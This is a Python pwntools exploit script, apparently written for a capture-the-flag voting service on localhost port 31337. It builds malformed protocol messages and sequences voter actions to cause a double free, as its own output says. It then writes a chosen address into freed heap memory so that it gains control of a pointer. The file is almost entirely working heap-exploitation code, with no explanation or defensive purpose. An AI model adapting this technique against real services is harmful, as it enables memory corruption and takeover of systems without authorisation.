#!/usr/bin/env python3

from pwn import *
from construct import *
from binascii import hexlify
import struct
import time
from hashlib import sha256
from ctypes import sizeof, c_int
from Voter import Voter

MESSAGE_HEADER_LEN = sizeof(c_int) + 32 + sizeof(c_int)
SERVER_PORT = 31337

POSE_QUESTION = 0
VOTER_VOTE    = 1

GenericMessageHeader = Struct(
    'directive' / Int32ul,
    'key'       / Bytes(32),
    'mlen'      / Int32ul
)

def data_received(data):
    if len(data) >= MESSAGE_HEADER_LEN:
        try:
            msgHeader = GenericMessageHeader.parse(data[0:MESSAGE_HEADER_LEN])
        except StreamError as e:
            print(f"Error while trying to parse message from interface: {str(e)}")
            return

        msg = data[MESSAGE_HEADER_LEN:]

        print(f"RECV from interface: [directive:{msgHeader.directive}][key:{hexlify(msgHeader.key)}][mlen:{msgHeader.mlen}] data:{msg.hex()}")

        return msgHeader, msg
        
        # print(f"End: {len(data)}")
    else:
        print(f"Received small message: {hexlify(data)}...")

def create_bad_msg(msg, directive, key):
    print(f"key: {hexlify(key)}")

    msg_size = 1
    full_msg_packed = struct.pack(f"<I32sI", directive, key, msg_size) + msg

    print(f"Creating message with len {len(full_msg_packed)}: {hexlify(full_msg_packed)}")

    return full_msg_packed

def send_answer(r, key):
    msg_packed = create_bad_msg(b"1", VOTER_VOTE, key)
    r.send(msg_packed)

def main():

    r = remote("localhost", 31337)

    voter = Voter(2)
    voter0 = Voter(0)
    voter1 = Voter(1)

    msg = voter0.create_msg(b"0"*8*4, Voter.VOTER_VOTE)
    r.send(msg)
    msg = r.recv(1024)
    msgHeader, msg = data_received(msg)
    print(msgHeader)
    print(msg)
    if msgHeader.key == b'0xFF'*32:
        pass
    else:
        voter0.handle_msg(msgHeader, msg)
    print("Voter0 voted!!\n\n")

    msg = voter1.create_msg(b"1"*8*4, Voter.VOTER_VOTE)
    r.send(msg)
    msg = r.recv(1024)
    msgHeader, msg = data_received(msg)
    print(msgHeader)
    print(msg)
    if msgHeader.key == b'0xFF'*32:
        pass
    else:
        voter0.handle_msg(msgHeader, msg)
    voter1.handle_msg(msgHeader, msg)
    print("Voter1 voted!!\n\n")

    msg = voter.create_msg(b"1"*8*4, Voter.VOTER_VOTE)
    r.send(msg)
    msg = r.recv(1024)
    msgHeader, msg = data_received(msg)
    print(msgHeader)
    print(msg)
    if msgHeader.key == b'0xFF'*32:
        pass
    else:
        voter0.handle_msg(msgHeader, msg)
    voter.handle_msg(msgHeader, msg)
    print("Voter2 voted!!\n\n")

    # print("sleeping...")
    # sleep(10)

    r.recv(1024)

    msg = voter.create_msg(b"", Voter.VOTER_READY)
    r.send(msg)
    msg = r.recv(1024)
    msgHeader, msg = data_received(msg)
    print(msgHeader)
    print(msg)
    if msgHeader.key == b'0xFF'*32:
        pass
    else:
        voter0.handle_msg(msgHeader, msg)
    voter.handle_msg(msgHeader, msg)
    print("Caused doublefree\n\n")

    # for i in range(0,8):
    #     # msg = voter.create_msg(b"A"*0x7F+b"\n", Voter.VOTER_LOG_CACHE)
    #     msg = voter.create_msg(b"A"*24, Voter.VOTER_LOG_CACHE)

    #     r.send(msg)

    #     msg = r.recv(1024)
    #     msgHeader, msg = data_received(msg)
    #     print(msgHeader)
    #     print(msg)
    #     voter.handle_msg(msgHeader, msg)

    # msg = voter.create_msg(b"A", Voter.VOTER_LOG_SAVE)
    # r.send(msg)
    # msg = r.recv(1024)
    # msgHeader, msg = data_received(msg)
    # print(msgHeader)
    # print(msg)
    # voter.handle_msg(msgHeader, msg)

    r.recv(1024)
    addr = p64(0x406160)

    print(addr)
    msg = voter.create_msg(addr, Voter.VOTER_VOTE)
    r.send(msg)
    msg = r.recv(1024)
    msgHeader, msg = data_received(msg)
    print(msgHeader)
    print(msg)
    if msgHeader.key == b'0xFF'*32:
        pass
    else:
        voter0.handle_msg(msgHeader, msg)
    voter.handle_msg(msgHeader, msg)
    print("Voter2 voted with custom pointer!!\n\n")


    msg = voter.create_msg(b"A"*8*4, Voter.VOTER_LOG_CACHE)
    r.send(msg)
    msg = r.recv(1024)
    msgHeader, msg = data_received(msg)
    print(msgHeader)
    print(msg)
    if msgHeader.key == b'0xFF'*32:
        pass
    else:
        voter0.handle_msg(msgHeader, msg)
    voter.handle_msg(msgHeader, msg)
    print("Voter2 cached a log to malloc!!\n\n")


    msg = voter.create_msg(b"A"*8*4, Voter.VOTER_LOG_CACHE)
    r.send(msg)
    msg = r.recv(1024)
    msgHeader, msg = data_received(msg)
    print(msgHeader)
    print(msg)
    if msgHeader.key == b'0xFF'*32:
        pass
    else:
        voter0.handle_msg(msgHeader, msg)
    voter.handle_msg(msgHeader, msg)
    print("Voter2 cached a log to malloc!! He controls pointer now\n\n")


if __name__ == "__main__":
    main()